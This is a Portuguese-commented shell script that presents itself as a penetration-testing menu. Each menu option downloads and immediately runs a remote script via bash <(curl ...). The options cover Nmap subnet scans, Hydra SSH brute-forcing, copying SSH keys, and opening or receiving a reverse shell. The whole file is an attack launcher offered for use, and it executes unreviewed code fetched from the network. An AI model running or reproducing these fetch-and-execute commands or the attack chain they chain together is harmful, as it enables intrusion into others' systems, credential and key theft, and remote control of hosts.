#!/bin/sh
main() {
    function0() {
        echo "Saindo..."
        exit
    }
    #Escaneia a subnet Usada
    function1() {
        echo "[1] Router Nmap Scan"
        bash <(curl -s https://raw.githubusercontent.com/lctrevizan/scripts/master/shell/pentest/nmaprouter.sh)
    }
    #Escaneia o range da subnet
    function2() {
        echo "[2] Nmap range scan"
        bash <(curl -s https://raw.githubusercontent.com/lctrevizan/scripts/master/shell/pentest/nmaprange.sh)
    }
    #Escaneia o range da subnet mostra apenas SSH aberto
    function3() {
        echo "[3] Nmap range scan (SSH)"
        bash <(curl -s https://raw.githubusercontent.com/lctrevizan/scripts/master/shell/pentest/nmapsshrange.sh)
    }
    #Bruteforce SSH
    function4() {
        echo "[4] HydraSSH Bruteforce"
        bash <(curl -s https://raw.githubusercontent.com/lctrevizan/scripts/master/shell/pentest/hydrassh.sh)
    }
    #Copia chaves SSH
    function5() {
        echo "[5] Copy SSH Keys"
        bash <(curl -s https://raw.githubusercontent.com/lctrevizan/scripts/master/shell/pentest/copykeys.sh)
    }
    #Cria Revese Shell
    function6() {
        echo "[6] Reverse Shell"
        bash <(curl -s https://raw.githubusercontent.com/lctrevizan/scripts/master/shell/pentest/reverseshell.sh)
    }
    #Recebe Revese Shell
    function7() {
        echo "[7] Recebe Reverse Shell"
        bash <(curl -s https://raw.githubusercontent.com/lctrevizan/scripts/master/shell/pentest/receiveshell.sh)
    }

        cat << "EOF"        
  ___         _          _     _            _    
 | _ \___ _ _| |_ ___ __| |_  | |_ ___  ___| |___
 |  _/ -_) ' \  _/ -_|_-<  _| |  _/ _ \/ _ \ (_-<
 |_| \___|_||_\__\___/__/\__|  \__\___/\___/_/__/                                                                          
EOF
    printf "\n\nSelecione uma opcao 0-7 \n\n[1] Router Nmap Scan\n[2] Nmap range scan\n[3] Nmap range scan SSH\n[4] HydraSSH bruteforce\n[5] Copy SSH Keys\n[6] Reverse Shell\n[7] Receive Reverse Shell\n[0] Exit\n "
    read num

    if [ "$num" -ge 0 ] && [ "$num" -le 7 ]; then
    eval "function$num"
    else
        echo "Numero invalido. Insira um numero entre 0 e 7."
    fi
}
main